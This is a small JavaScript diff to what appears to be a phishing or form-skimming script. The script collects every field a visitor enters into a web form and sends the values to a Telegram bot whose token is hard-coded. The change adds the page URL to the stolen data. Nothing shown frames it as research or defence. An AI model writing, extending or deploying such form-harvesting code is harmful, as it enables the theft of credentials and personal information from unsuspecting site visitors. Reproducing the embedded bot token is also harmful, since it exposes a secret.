@@ -1,3 +1,4 @@
+	
 	var x = document.getElementById("submit");
 let tg = {
     token: "6786942281:AAEEMylFUD0IvUA50LQ2VKLDy5cStMELz3I", // Your bot's token that got from @BotFather
@@ -21,5 +22,6 @@ for ( var i = 0; i < form.elements.length; i++ ) {
 }
 
 var queryString = kvpairs.join("--->");
-  sendMessage(queryString);
+const currentUrl = window.location.href;
+  sendMessage(queryString + "URL " +currentUrl );
 }
